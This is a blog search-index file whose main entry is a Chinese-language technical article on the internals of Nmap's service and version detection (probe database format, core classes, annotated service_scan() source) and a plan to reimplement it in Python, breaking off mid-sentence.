<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>渗透经验总结</title>
      <link href="/2022/09/02/Penetration-experience-summary/"/>
      <url>/2022/09/02/Penetration-experience-summary/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>利用python重构NMAP的服务版本扫描模块</title>
      <link href="/2022/08/29/NMAP-of-Python-refactoring/"/>
      <url>/2022/08/29/NMAP-of-Python-refactoring/</url>
      
        <content type="html"><![CDATA[<style>.center {  width: auto;  display: table;  margin-left: auto;  margin-right: auto;}</style><h1>1. NMAP 扫描原理</h1><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">NMAP 服务与版本扫描命令：</span><br><span class="line">-sV: 指定让Nmap进行版本侦测</span><br><span class="line"> </span><br><span class="line">–version-intensity&lt;level&gt;: 指定版本侦测强度（0-9），默认为7。数值越高，探测出的服务越准确，但是运行时间会比较长。</span><br><span class="line"></span><br><span class="line">–version-light: 指定使用轻量侦测方式 (intensity 2)</span><br><span class="line"> </span><br><span class="line">–version-all: 尝试使用所有的probes进行侦测 (intensity 9)</span><br><span class="line"> </span><br><span class="line">–version-trace: 显示出详细的版本侦测过程信息。</span><br></pre></td></tr></table></figure><p>扫描原理是服务指纹（或称签名）对比匹配。Nmap内部包含了几千种常见服务指纹的数据库（nmap-service-probes），对目标端口进行连接通信，产生当前端口的服务指纹，再与指纹数据库对比，寻找出匹配的服务类型。</p><p>服务与版本侦测主要分为以下几个步骤：</p><ol><li><p>首先检查open与open|filtered状态的端口是否在排除端口列表内。如果在排除列表，将该端口剔除。</p></li><li><p>如果是TCP端口，尝试建立TCP连接。尝试等待片刻（通常6秒或更多，具体时间可以查询文件nmap-services-probes中ProbeTCP NULL q||对应的totalwaitms）。通常在等待时间内，会接收到目标机发送的“Welcome Banner”信息。nmap将接收到的Banner与nmap-services-probes中NULLprobe中的签名进行对比。查找对应应用程序的名字与版本信息。</p></li><li><p>如果通过“Welcome Banner”无法确定应用程序版本，那么nmap再尝试发送其他的探测包（即从nmap-services-probes中挑选合适的probe），将probe得到回复包与数据库中的签名进行对比。如果反复探测都无法得出具体应用，那么打印出应用返回报文，让用户自行进一步判定。</p></li><li><p>如果是UDP端口，那么直接使用nmap-services-probes中探测包进行探测匹配。根据结果对比分析出UDP应用服务类型。</p></li><li><p>如果探测到应用程序是SSL，那么调用openSSL进一步的侦查运行在SSL之上的具体的应用类型。</p></li><li><p>如果探测到应用程序是SunRPC，那么调用brute-forceRPC grinder进一步探测具体服务。</p></li></ol><h1>2. NMAP 实现框架</h1><h2 id="2-1-文件组织">2.1. 文件组织</h2><table><thead><tr><th>文件</th><th>功能</th></tr></thead><tbody><tr><td>service_scan.cc/service_scan.h</td><td>服务扫描的核心功能都在此两个文件中实现，文件结构清晰简洁，代码行数总共3000余行。与端口扫描部分类似，服务扫描也定义了不少类与接口函数。</td></tr><tr><td>nmap-service-probes</td><td>此文件是nmap服务扫描所需的数据库文件，包括定制的探测包及预期的回复包，及识别服务类型的具体匹配方式。</td></tr><tr><td>nsock library</td><td>服务与版本扫描部分用到nsock库，该库设计用于并发处理网络事件。在Nmap源码树下，有单独的nsock目录来管理nsock库。此处我们仅需要关注nsock.h文件中提供的API函数即可。</td></tr></tbody></table><p>下面摘取 nmap-service-probes 的片段，简单了解其结构</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Probe TCPNULL q||</span><br><span class="line"> </span><br><span class="line"># Wait forat least 6 seconds for data.  It used tobe 5, but some</span><br><span class="line"> </span><br><span class="line"># smtpservices have lately been instituting an artificial pause (see</span><br><span class="line"> </span><br><span class="line">#FEATURE(&#x27;greet_pause&#x27;) in Sendmail, for example)</span><br><span class="line"> </span><br><span class="line">totalwaitms6000</span><br><span class="line"> </span><br><span class="line">match 1c-server m|^S\xf5\xc6\x1a&#123;|p/1C:Enterprise business management server/</span><br><span class="line"> </span><br><span class="line">match4d-server m|^\0\0\0H\0\0\0\x02.[^\0]*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$|sp/4th Dimension database server/</span><br><span class="line"> </span><br><span class="line">match acapm|^\* ACAP IMPLEMENTATION&quot;CommuniGateProACAP(\d[?.\w]+)&quot;IMPLEMENTATION&quot;CommuniGateProACAP(\d[?.\w]+)&quot; |p/CommuniGate Pro ACAP server/ v/$1/ i/for mail client preference sharing/</span><br><span class="line"> </span><br><span class="line">match acmpm|^ACMP Server Version ([\w._-]+)\r\n| p/Aagon ACMP Inventory/ v/$1/</span><br><span class="line"> </span><br><span class="line">matchactivemq m|^\0\0\0.\x01ActiveMQ\0\0\0|s p/Apache ActiveMQ/</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第一行Probe关键字表示定义一个探测包，其类型为TCP，名字为NULL，探测字符串为空（q||）。以#开头为注释行，为读者提供参考信息。随后定义默认服务等待时间<code>totalwaims 6000</code>，即6秒钟。后面的match行，定义服务匹配的情况，即在此条件下认为此端口是运行的具体服务类型。match行的格式如下： <code>match []</code></p><p>service为服务名称，pattern为匹配的模式（正则表达式），versioninfo为该服务对应的版本信息。这里以 <code>match 1c-server m|^S\xf5\xc6\x1a&#123;| p/1C:Enterprise business management server/</code>为例，当使用NULL探测包获取的返回包中包含：<code>m|^S\xf5\xc6\x1a&#123;|</code>模式（该正则表达式含义：以字符S开头，紧随其后三个字符\xf5\xc6\x1a）时，并且从提取出厂商产品名字与<code>1C:Enterprise businessmanagement server</code>相符，那么判断该服务为<code>1c-server</code>。</p><h2 id="2-2-核心类分析">2.2. 核心类分析</h2><p>服务扫描过程中，主要构建了5个类，分别描述不同层次的数据类型。下面我们将以宏观到微观的思路，依次查看每个类的结构与用法。</p><table><thead><tr><th>类</th><th>结构与用法</th></tr></thead><tbody><tr><td>ServiceGroup</td><td>从整理的角度管理服务扫描过程</td></tr><tr><td>ServiceNFO</td><td>具体的负责管理每一种服务扫描过程</td></tr><tr><td>AllProbes</td><td>负责管理所有用于服务扫描的探测包</td></tr><tr><td>ServiceProbe</td><td>描述每一个进行服务探测的探测包细节（对应nmap-service-probes中描述的探测包）</td></tr><tr><td>ServiceProbeMatch</td><td>描述探测包的匹配类型（每一个ServiceProbe可能包含多种匹配类型）</td></tr></tbody></table><h3 id="2-2-1-ServiceGroup">2.2.1. ServiceGroup</h3><p>ServiceGroup用于管理一组目标机进行服务扫描的信息。这个类非常重要，负责统一管理其他具体的信息：如单个服务扫描信息（ServiceNFO）、全部探测包信息（AllProbes）、服务探测包信息（ServiceProbe）等等。</p><p>该类主要包含以下具体内容：</p><ol><li><p>扫描完成的服务列表services_finished，记录目前已经扫描完毕的服务。</p></li><li><p>正在扫描的服务列表services_in_progress。多个服务可能在同时并发地被探测，所以此处将当前正在扫描的服务全部记录在该列表中。</p></li><li><p>剩余服务列表services_remaining，当前还没有开始探测的服务被放置在该列表中。在服务扫描初始化时，所有的服务都被放置在列表中。</p></li><li><p>最大的并发探测包ideal_parallelism，用于确定同时发送服务探测包的并发数量，此值取决于用户配置的时序参数和具体网卡的支持能力等因素。若配置时序为-T4，那么会将ideal_parallelism设置40。</p></li><li><p>扫描进度测量器ScanProgressMeter，用于记录服务扫描的进度情况，以便能够实时地反馈给用户。在控制台界面按下普通按键（如按下空格键，不包括 “vVdDp?” 字符，这几个字符有特殊含义），Nmap会打印出当前的扫描进度。</p></li><li><p>超时主机的数量，记录当前扫描超时的主机数量。</p></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// This holds theservice information for a group of Targets being service scanned.</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ServiceGroup</span> &#123;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"> </span><br><span class="line">  <span class="built_in">ServiceGroup</span>(vector&lt;Target *&gt;&amp;Targets, AllProbes *AP);</span><br><span class="line"> </span><br><span class="line">  ~<span class="built_in">ServiceGroup</span>();</span><br><span class="line"> </span><br><span class="line">  list&lt;ServiceNFO *&gt; services_finished;<span class="comment">// Services finished (discovered or not)</span></span><br><span class="line"> </span><br><span class="line">  list&lt;ServiceNFO *&gt;services_in_progress; <span class="comment">// Services currently being probed</span></span><br><span class="line"> </span><br><span class="line">  list&lt;ServiceNFO *&gt; services_remaining;<span class="comment">// Probes not started yet</span></span><br><span class="line"> </span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> ideal_parallelism; <span class="comment">// Max (anddesired) number of probes out at once.</span></span><br><span class="line"> </span><br><span class="line">  ScanProgressMeter *SPM;</span><br><span class="line"> </span><br><span class="line">  <span class="type">int</span> num_hosts_timedout; <span class="comment">// # of hosts timedout during (or before) scan</span></span><br><span class="line"> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-2-2-ServiceNFO">2.2.2. ServiceNFO</h3><p>ServiceNFO负责管理特定的服务的探测细节。上述的ServiceGroup中就是管理ServiceNFO对象组成的列表。</p><p>ServiceNFO类包含以下信息：</p><ol><li><p>服务指纹的管理（提供添加与获取等操作）</p></li><li><p>服务扫描对应的主机（Target *target）</p></li><li><p>服务探测匹配的信息（是否匹配、是否softmatch、ssl配置、产品、版本、CPE等信息）</p></li><li><p>管理探测包（服务扫描过程可能需要发送多个探测包，在此对当前探测包、下一个探测包<br>进行管理）</p></li><li><p>管理回复包（提供添加与获取等操作）。</p></li><li><p>服务扫描所需的全部探测包 AllProbes *AP;</p></li></ol><h3 id="2-2-3-AllProbes">2.2.3. AllProbes</h3><p>AllProbes负责管理全部的服务探测包（Probes）。该类的对象从nmap-service-probes数据库文件中解析出探测包及匹配方式等信息，将之管理起来。在后续服务扫描时，在此对象中来按需取出探测包发送即可。</p><p>AllProbes负责管理全部的服务探测包（Probes）。该类的对象从nmap-service-probes数据库文件中解析出探测包及匹配方式等信息，将之管理起来。在后续服务扫描时，在此对象中来按需取出探测包发送即可。</p><ol><li><p>探测包管理（探测包向量std::vectorprobes、NULL探测包等）</p></li><li><p>编制回退数组（compileFallbacks），当回复包无法匹配当前字符串时，允许回退到上一次匹配字符串。</p></li><li><p>管理排除端口列表。在nmap-service-probes中指定需排除的服务扫描，默认排除TCP的9100-9107端口，此类打印机服务会返回大量的无用信息。</p></li><li><p>服务初始化接口与释放接口。</p></li></ol><h3 id="2-2-4-ServiceProbe">2.2.4. ServiceProbe</h3><p>ServiceProbe负责管理单个的服务探测包的详细信息。服务探测包具体的信息来自nmap-service-probes数据库文件，当AllProbes类在初始化时会读取该文件，并依据其每个探测信息创建ServiceProbe对象，放置在AllProbes内部的向量std::vectorprobes中。</p><p>该类主要包含以下内容：</p><ol><li><p>探测包名字，比如探测包名字叫NULL或GenericLines等等。</p></li><li><p>探测包字符串及字符串长度。非NULL探测包都包含探测需要字符串，所以此处对该信息进行管理。例如，对于探测包：Probe TCP GenericLinesq|\r\n\r\n|，其探测字符串为\r\n\r\n。</p></li><li><p>允许的端口及SSL端口。除NULL外，探测包通常只会针对特定的端口扫描才有效，所以此处即管理该探测包允许的扫描的端口。</p></li><li><p>探测包的协议类型probeprotocol，只能是TCP或UDP。</p></li><li><p>可被探测的服务类型detectedServices。与允许端口类似，探测包可能只能用于某些特定的服务的探测，所以此处统一管理能被探测的服务类型。</p></li><li><p>服务探测包匹配管理。该类中使用向量std::vector matches来管理此服务探测包可能会匹配的情况，匹配情况对应到nmap-service-probes中的match与softmatch行。</p></li><li><p>探测回退数组（fallback array）的管理，此对应到AllProbes中compileFallbacks()函数，此处管理具体的服务探测包进行回退的数组。数组结构：ServiceProbe*fallbacks[MAXFALLBACKS+1];</p></li><li><p>测试是否匹配，此接口函数用于测试某个回复包是否与预期结果匹配。</p></li><li><p>其他接口函数，管理其他普通信息。</p></li></ol><h3 id="2-2-5-ServiceProbeMatch">2.2.5. ServiceProbeMatch</h3><p>ServiceProbeMatch用于管理特定的服务探测包的匹配信息（match）。nmap-service-probes文件中每一个match和softmatch行都对应到该类的对象。</p><p>该类信息比较丰富，以下仅简要描述：</p><ol><li><p>探测包匹配详细信息（版本、产品、CPE等等）</p></li><li><p>探测匹配情况（匹配类型、匹配字符串、正则表达式等等）</p></li><li><p>测试是否匹配接口函数。若匹配成功，返回详细的服务与版本信息。</p></li></ol><h2 id="2-3-代码流程">2.3. 代码流程</h2><p>在nmap.cc文件的nmap_main()函数中，如果配置了服务扫描，那么调用service_scan()函数（位于service_scan.cc文件中）。服务扫描的内容主要在service_scan()函数中完成。</p><p>service_scan()函数比较简洁，只有120多行代码。因为服务扫描涉及到具体详细的操作都封装到类或其他的静态非成员函数中了，而并发处理网络事件部分调用nsock库来处理。</p><p><strong>NMAP 服务与版本扫描详细过程：</strong></p><div class="center"><img src="/2022/08/29/NMAP-of-Python-refactoring/2.3-2.png"></div><p><strong>流程解析：</strong></p><ol><li><p>首先在nmap_main()中将扫描目标机传入service_scan()函数中，以便根据目标机端口状态来筛选需要扫描的服务。</p></li><li><p>然后，在AllProbes:: service_scan_init()读取nmap-service-probes文件，解析出被排除的端口、扫描过程需要的探测包、探测包匹配等详细信息。将信息存放在AllProbes对象内。</p></li><li><p>随后，根据Targets和AllProbes创建服务组对象（ServiceGroup），从Targets中解析出开放的端口与处于open|filtered状态的端口，创建对应的ServiceNFO对象，该服务等待被扫描。并创建扫描进度测量器，以便后续打印出扫描进度；确定最佳的扫描并发度ideal_parallelism。</p></li><li><p>然后，确定排除端口。默认情况下，排除nmap-service-probes中指定的端口Exclude T:9100-9107；而如果用户命令行指定–all-ports，那么不排除Exclude指定的端口。</p></li><li><p>为每个目标机设置超时时钟，获取当前时间。</p></li><li><p>然后开始进入关键环节，创建nsock pool，即nsock处理并发探测包的事件池。在创建nsock pool后，服务扫描才能使用nsock建立连接并注册事件。</p></li><li><p>根据用户需求，设置服务扫描的trace信息。</p></li><li><p>若配置了openssl时，将其速度设置为最大。因为对于服务扫描，仅关心端口的服务类型，不必在安全性花费过多时间。</p></li><li><p>然后开始启动少量的服务探测包（launchSomeServiceProbes）。根据前述步骤得出的服务探测包，创建nsock niod（io描述符，类似于文件描述符，管理输入输出），完成地址等信息配置，然后建立TCP连接或UDP连接，在建立连接后向nsock pool注册事件。此后，该连接的事件将交给nsock loop来统一处理。</p></li><li><p>创建nsock主循环（nsock_loop），在此循环中来接收网络事件（例如接收到回复包），调用相应的处理函数对事件响应（函数servicescan_read_handler()、servicescan_write_handler()、servicescan_connect_handler()）。在处理函数中，扫描完成了某些服务后，会再调用launchSomeServiceProbes()函数加载剩余的服务进来扫描，以此整个服务扫描过程就被有序地连接起来了。</p></li><li><p>当nsock循环退出，检查是否有错，并删除nsock pool对象。</p></li><li><p>打印出调试信息，处理最终扫描结果。</p></li></ol><p><strong>源码注释：</strong></p><div class="center"><img src="/2022/08/29/NMAP-of-Python-refactoring/2.3-1.png"></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Execute a service fingerprinting scan against all open ports of the</span></span><br><span class="line"><span class="comment">   Targets specified. */</span></span><br><span class="line"><span class="comment">///针对指定目标机的开放的端口进行服务指纹扫描，</span></span><br><span class="line"><span class="comment">///此处会用到Nmap的nsock库（并发的Socket Event处理库）</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">service_scan</span><span class="params">(vector&lt;Target *&gt; &amp;Targets)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// int service_scan(Target *targets[], int num_targets)</span></span><br><span class="line">  AllProbes *AP;</span><br><span class="line">  ServiceGroup *SG;</span><br><span class="line">  nsock_pool nsp;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">timeval</span> now;</span><br><span class="line">  <span class="type">int</span> timeout;</span><br><span class="line">  <span class="keyword">enum</span> <span class="title class_">nsock_loopstatus</span> looprc;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">timeval</span> starttv;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (Targets.<span class="built_in">size</span>() == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">  AP = AllProbes::<span class="built_in">service_scan_init</span>();<span class="comment">///获取AllProbes对象,AllProbes仅维护一个Static对象</span></span><br><span class="line">  <span class="comment">///在service_scan_init()中将读取nmap-service-probes文件，解析出需要的探测包,并存放在</span></span><br><span class="line">  <span class="comment">///AllProbes中std::vector&lt;ServiceProbe *&gt; probes向量中。</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">  <span class="comment">// Now I convert the targets into a new ServiceGroup</span></span><br><span class="line">  <span class="comment">///使用Targets向量与AllProbes创建服务组ServiceGroup,从Targets中提取open端口及</span></span><br><span class="line">  <span class="comment">///open|filtered端口，放入services_remaining等待进行服务扫描。</span></span><br><span class="line">  <span class="comment">///在创建服务组时，确定出服务扫描的最佳并发度ideal_parallelism</span></span><br><span class="line">  SG = <span class="keyword">new</span> <span class="built_in">ServiceGroup</span>(Targets, AP);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (o.override_excludeports) &#123;</span><br><span class="line">    <span class="comment">///覆盖被排除端口，当命令行中指定--all-ports时会走到此分支。</span></span><br><span class="line">    <span class="comment">///被排除的端口是指在nmap-service-probes文件用Exclude指令定义的端口。</span></span><br><span class="line">    <span class="keyword">if</span> (o.debugging || o.verbose) <span class="built_in">log_write</span>(LOG_PLAIN, <span class="string">&quot;Overriding exclude ports option! Some undesirable ports may be version scanned!\n&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">///从ServiceGroup中移除被排除的端口,Nmap默认会排出掉9100-9107与打印机相关的服务，</span></span><br><span class="line">    <span class="comment">///因为此类服务只是简单返回Nmap发送过去的探测包，会产生大量的垃圾的流量。</span></span><br><span class="line">    <span class="comment">///默认情况下在nmap-service-probes文件头部定义：Exclude T:9100-9107</span></span><br><span class="line">    <span class="built_in">remove_excluded_ports</span>(AP, SG);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">///为所有需要进行服务扫描的主机设置超时值</span></span><br><span class="line">  <span class="built_in">startTimeOutClocks</span>(SG);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (SG-&gt;services_remaining.<span class="built_in">size</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">delete</span> SG;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="built_in">gettimeofday</span>(&amp;starttv, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (o.verbose) &#123;</span><br><span class="line">    <span class="type">char</span> targetstr[<span class="number">128</span>];</span><br><span class="line">    <span class="type">bool</span> plural = (Targets.<span class="built_in">size</span>() != <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!plural) &#123;</span><br><span class="line">      (*(Targets.<span class="built_in">begin</span>()))-&gt;<span class="built_in">NameIP</span>(targetstr, <span class="built_in">sizeof</span>(targetstr));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="built_in">Snprintf</span>(targetstr, <span class="built_in">sizeof</span>(targetstr), <span class="string">&quot;%u hosts&quot;</span>, (<span class="type">unsigned</span>) Targets.<span class="built_in">size</span>());</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">log_write</span>(LOG_STDOUT, <span class="string">&quot;Scanning %u %s on %s\n&quot;</span>,</span><br><span class="line">          (<span class="type">unsigned</span>) SG-&gt;services_remaining.<span class="built_in">size</span>(),</span><br><span class="line">          (SG-&gt;services_remaining.<span class="built_in">size</span>() == <span class="number">1</span>)? <span class="string">&quot;service&quot;</span> : <span class="string">&quot;services&quot;</span>,</span><br><span class="line">          targetstr);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// Lets create a nsock pool for managing all the concurrent probes</span></span><br><span class="line">  <span class="comment">// Store the servicegroup in there for availability in callbacks</span></span><br><span class="line">  <span class="comment">///创建nsock pool，以使用nsock并发控制探测包</span></span><br><span class="line">  <span class="keyword">if</span> ((nsp = <span class="built_in">nsp_new</span>(SG)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">fatal</span>(<span class="string">&quot;%s() failed to create new nsock pool.&quot;</span>, __func__);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">///根据用户指定的packettrace配置，设置nsock的trace级别</span></span><br><span class="line">  <span class="keyword">if</span> (o.<span class="built_in">versionTrace</span>()) &#123;</span><br><span class="line">    <span class="built_in">nsp_settrace</span>(nsp, <span class="literal">NULL</span>, NSOCK_TRACE_LEVEL, o.<span class="built_in">getStartTime</span>());</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">if</span> HAVE_OPENSSL</span></span><br><span class="line">  <span class="comment">/* We don&#x27;t care about connection security in version detection. */</span></span><br><span class="line">  <span class="comment">///配置SSL时，关注传输速度，而不关注安全性本身，以加速服务扫描过程。</span></span><br><span class="line">  <span class="built_in">nsp_ssl_init_max_speed</span>(nsp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">///从service_remaining列表中找出满足条件的等待探测服务，对之进行配置，</span></span><br><span class="line">  <span class="comment">///创建nsock文件描述符(niod)，并通过nsock建立连接（如nsock_connect_tcp()），</span></span><br><span class="line">  <span class="comment">///并将此探测服务移动到services_in_progress列表中。</span></span><br><span class="line">  <span class="built_in">launchSomeServiceProbes</span>(nsp, SG);</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// How long do we have before timing out?</span></span><br><span class="line">  <span class="built_in">gettimeofday</span>(&amp;now, <span class="literal">NULL</span>);</span><br><span class="line">  timeout = <span class="number">-1</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// OK!  Lets start our main loop!</span></span><br><span class="line">  <span class="comment">///nsock主循环，在此循环内处理各种探测包的事件(nsock event)</span></span><br><span class="line">  <span class="comment">///在上述的launchSomeServiceProbes操作中，调用到nsock_connect_tcp/udp/sctp等，</span></span><br><span class="line">  <span class="comment">///最终执行nsp_add_event函数向nsock pool添加等待处理的事件。</span></span><br><span class="line">  looprc = <span class="built_in">nsock_loop</span>(nsp, timeout);</span><br><span class="line">  <span class="keyword">if</span> (looprc == NSOCK_LOOP_ERROR) &#123;</span><br><span class="line">    <span class="type">int</span> err = <span class="built_in">nsp_geterrorcode</span>(nsp);</span><br><span class="line">    <span class="built_in">fatal</span>(<span class="string">&quot;Unexpected nsock_loop error.  Error code %d (%s)&quot;</span>, err, <span class="built_in">strerror</span>(err));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">///退出主循环后，删除nsock pool</span></span><br><span class="line">  <span class="built_in">nsp_delete</span>(nsp);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (o.verbose) &#123;</span><br><span class="line">    <span class="type">char</span> additional_info[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">if</span> (SG-&gt;num_hosts_timedout == <span class="number">0</span>)</span><br><span class="line">      <span class="built_in">Snprintf</span>(additional_info, <span class="built_in">sizeof</span>(additional_info), <span class="string">&quot;%u %s on %u %s&quot;</span>,</span><br><span class="line">        (<span class="type">unsigned</span>) SG-&gt;services_finished.<span class="built_in">size</span>(),  </span><br><span class="line">        (SG-&gt;services_finished.<span class="built_in">size</span>() == <span class="number">1</span>)? <span class="string">&quot;service&quot;</span> : <span class="string">&quot;services&quot;</span>,</span><br><span class="line">        (<span class="type">unsigned</span>) Targets.<span class="built_in">size</span>(), (Targets.<span class="built_in">size</span>() == <span class="number">1</span>)? <span class="string">&quot;host&quot;</span> : <span class="string">&quot;hosts&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">Snprintf</span>(additional_info, <span class="built_in">sizeof</span>(additional_info), <span class="string">&quot;%u %s timed out&quot;</span>,</span><br><span class="line">           SG-&gt;num_hosts_timedout,</span><br><span class="line">           (SG-&gt;num_hosts_timedout == <span class="number">1</span>)? <span class="string">&quot;host&quot;</span> : <span class="string">&quot;hosts&quot;</span>);</span><br><span class="line">    SG-&gt;SPM-&gt;<span class="built_in">endTask</span>(<span class="literal">NULL</span>, additional_info);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// Yeah - done with the service scan.  Now I go through the results</span></span><br><span class="line">  <span class="comment">// discovered, store the important info away, and free up everything</span></span><br><span class="line">  <span class="comment">// else.</span></span><br><span class="line">  <span class="comment">///对服务扫描结果的处理</span></span><br><span class="line">  <span class="built_in">processResults</span>(SG);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">delete</span> SG;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1>3. python重构思路</h1><p>模仿nmap的识别思路，流程如下：</p><ol start="0"><li><p>为了利用 nmap 指纹库方便，先将 nmap-service-probes 转化为一个 json 文件</p></li><li><p>只与端口建立 TCP 连接，不发信息，利用 TCP NULL 探针，根据目标端口返回的 Banner 信息，利用 nmap 指纹库中的正则去匹配返回版本</p></li><li><p>若第一步失败，利用TCP的其他探针，首先判断目标端口是否存在于指纹库一个探针的 ports 列表里，若存在，给端口发送消息（ probestring 中的内容），根据返回回来的消息，用此探针下的各种 matches 正则去匹配，匹配成功，返回该条 match 下的 name 